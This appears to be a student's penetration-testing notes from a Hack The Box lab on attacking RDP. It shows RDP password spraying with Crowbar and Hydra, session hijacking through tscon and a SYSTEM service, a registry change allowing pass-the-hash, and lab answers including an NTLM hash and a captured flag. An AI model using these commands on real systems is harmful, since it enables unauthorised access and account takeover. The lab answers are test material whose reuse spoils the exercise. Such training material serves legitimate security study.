By default, RDP uses port `TCP/3389`. Using `Nmap`, we can identify the available RDP service on the target host:
```shell
nmap -Pn -p3389 192.168.2.143 
```

## Misconfigurations
Since RDP takes user credentials for authentication, one common attack vector against the RDP protocol is password guessing. Although it is not common, we could find an RDP service without a password if there is a misconfiguration.

One caveat on password guessing against Windows instances is that you should consider the client's password policy. In many cases, a user account will be locked or disabled after a certain number of failed login attempts. In this case, we can perform a specific password guessing technique called `Password Spraying`.

Using the [Crowbar](https://github.com/galkan/crowbar) tool, we can perform a password spraying attack against the RDP service. As an example below, the password `password123` will be tested against a list of usernames in the `usernames.txt` file. The attack found the valid credentials as `administrator` : `password123` on the target RDP host.
#### Crowbar - RDP Password Spraying
```shell
> crowbar -b rdp -s 192.168.220.142/32 -U users.txt -c 'password123'

2022-04-07 15:35:50 START
2022-04-07 15:35:50 Crowbar v0.4.1
2022-04-07 15:35:50 Trying 192.168.220.142:3389
2022-04-07 15:35:52 RDP-SUCCESS : 192.168.220.142:3389 - administrator:password123
2022-04-07 15:35:52 STOP
```

#### Hydra - RDP Password Spraying
```shell
hydra -L usernames.txt -p 'password123' 192.168.2.143 rdp
```

## Protocol Specific Attacks
Let's imagine we successfully gain access to a machine and have an account with local administrator privileges. If a user is connected via RDP to our compromised machine, we can hijack the user's remote desktop session to escalate our privileges and impersonate the account. In an Active Directory environment, this could result in us taking over a Domain Admin account or furthering our access within the domain.

#### RDP Session Hijacking
As shown in the example below, we are logged in as the user `juurena` (UserID = 2) who has `Administrator` privileges. Our goal is to hijack the user `lewen` (User ID = 4), who is also logged in via RDP.

![[Pasted image 20251021143857.png]]

To successfully impersonate a user without their password, we need to have `SYSTEM` privileges and use the Microsoft [tscon.exe](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/tscon) binary that enables users to connect to another desktop session. It works by specifying which `SESSION ID` (`4` for the `lewen` session in our example) we would like to connect to which session name (`rdp-tcp#13`, which is our current session). So, for example, the following command will open a new console as the specified `SESSION_ID` within our current RDP session:

```cmd-session
C:\htb> tscon #{TARGET_SESSION_ID} /dest:#{OUR_SESSION_NAME}
```

If we have local administrator privileges, we can use several methods to obtain `SYSTEM` privileges, such as [PsExec](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec) or [Mimikatz](https://github.com/gentilkiwi/mimikatz). A simple trick is to create a Windows service that, by default, will run as `Local System` and will execute any binary with `SYSTEM` privileges. We will use [Microsoft sc.exe](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/sc-create) binary. First, we specify the service name (`sessionhijack`) and the `binpath`, which is the command we want to execute. Once we run the following command, a service named `sessionhijack` will be created.

```cmd-session
C:\htb> query user

 USERNAME     SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME
>juurena      rdp-tcp#13          1  Active          7  8/25/2021 1:23 AM
 lewen        rdp-tcp#14          2  Active          *  8/25/2021 1:28 AM

C:\htb> sc.exe create sessionhijack binpath= "cmd.exe /k tscon 2 /dest:rdp-tcp#13"

[SC] CreateService SUCCESS
```

To run the command, we can start the `sessionhijack` service :
```cmd-session
C:\htb> net start sessionhijack
```
Once the service is started, a new terminal with the `lewen` user session will appear.
_Note: This method no longer works on Server 2019._

## RDP Pass-the-Hash (PtH)
(See Password Attack Module)


### Questions 

1. What is the name of the file that was left on the Desktop? (Format example: filename.txt)
```txt
pentest-notes.txt
```
2.  Which registry key needs to be changed to allow Pass-the-Hash with the RDP protocol? 
````cmd-session
DisableRestrictedAdmin
````
3.  Connect via RDP with the Administrator account and submit the flag.txt as you answer.
```shell
On htb-rdp session CMD:
C:\> reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f

Then retrieve Hash in pentest-notes.txt file and PtH RDP as Administrator:0E14B9D6330BF16C30B1924111104824

> xfreerdp  /v:10.129.203.13 /u:Administrator /pth:0E14B9D6330BF16C30B1924111104824  /drive:share,/workspace/CPTS/tmp


Open flag.txt:
HTB{RDP_P4$$_Th3_H4$#}
```


---

# Latest RDP Vulnerabilities 

In 2019, a critical vulnerability was published in the RDP (`TCP/3389`) service that also led to remote code execution (`RCE`) with the identifier [CVE-2019-0708](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2019-0708). This vulnerability is known as `BlueKeep`. It does not require prior access to the system to exploit the service for our purposes. However, the exploitation of this vulnerability led and still leads to many malware or ransomware attacks.